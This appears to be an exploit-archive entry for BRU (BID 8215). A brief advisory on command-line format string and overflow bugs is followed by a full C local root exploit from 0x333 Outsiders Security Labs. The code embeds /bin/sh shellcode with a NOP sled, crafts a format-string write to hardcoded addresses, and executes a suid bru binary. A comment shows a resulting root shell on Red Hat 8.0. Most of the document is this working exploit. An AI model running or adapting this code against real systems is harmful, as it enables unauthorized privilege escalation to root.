source: http://www.securityfocus.com/bid/8215/info
 
It has been reported that BRU may not properly parse commandline arguments, potentially leading to at least two vectors of exploitation. It may be possible for local attackers to conduct format string-based attacks as well as buffer overflow-based attacks.
 
It should be noted that although BRU does not ship with the suid bit set by default, documentation within the software may instruct users to enable it.

/*
*  bru--format--root-expolit::^^)
*   
*  coded by nic
* 
* (c) 0x333 Outsiders Security Labs / www.0x333.org
* test in redhat 8.0
* bash-2.05b$ ls -al bru
* -rws--x--x 1 root bin 165836 11�29 1999 bru
* bash-2.05b$ id
* uid=37(rpm) gid=37(rpm) groups=37(rpm)
* bash-2.05b$ ./bruex
* Use shellcode 0xc4ffff65
* sh-2.05b#
* ths : sam @ SST Group
*/

#include <stdio.h>
#include <strings.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>

#define MAX_FMT_LENGTH 128
#define ADD 0x100
#define FOUR sizeof( size_t ) * 4
#define HELL "./bru"
#define OCT( b0, b1, b2, b3, addr, str ) { \
b0 = (addr >> 24) & 0xff; \
b1 = (addr >> 16) & 0xff; \
b2 = (addr >> 8) & 0xff; \
b3 = (addr ) & 0xff; \
if ( b0 * b1 * b2 * b3 == 0 ) { \
printf( "\n%s contains a NUL byte. Leaving...\n", str ); \
exit( EXIT_FAILURE ); \
} \
}

/ shell by sam/
char shellcode[]= 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
/* shellcode */
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31"
"\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d"
"\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff"
"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";
int
build_un( char * buf, unsigned int locaddr, unsigned int retaddr, unsigned int
offset, unsigned int base )
{
unsigned char b0, b1, b2, b3;
int start = ( (base / ADD) + 1 ) * ADD;
int sz;

OCT( b0, b1, b2, b3, locaddr, "[ locaddr ]" );
sz = snprintf( buf, FOUR + 1, /* 16 char to have the 4 addresses */
"%c%c%c%c" /* + 1 for the ending \0 */
"%c%c%c%c"
"%c%c%c%c"
"%c%c%c%c",
b3, b2, b1, b0,
b3 + 1, b2, b1, b0,
b3 + 2, b2, b1, b0,
b3 + 3, b2, b1, b0 );

OCT( b0, b1, b2, b3, retaddr, "[ retaddr ]" );

return snprintf( buf + sz, MAX_FMT_LENGTH,
"%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n",
b3 - FOUR + start - base, offset,
b2 - b3 + start, offset + 1,
b1 - b2 + start, offset + 2,
b0 - b1 + start, offset + 3 );
}

int main()
{
int ret_addr;
char buf[256];
char *args[24];
char *env[2];

ret_addr = 0xc4fffffa - strlen(shellcode) - strlen(HELL);

/* put in env */
env[0] = shellcode;
env[1] = NULL;

printf ("Use shellcode 0x%x\n", ret_addr);

memset(buf, 0, sizeof(buf));
build_un(buf, 0x08070148, 0x97d7d741, 73 ,3);

args[0] = HELL;
args[1] = buf;
args[2] = NULL;

execve (args[0], args, env);
perror ("execve");

return 0;
}

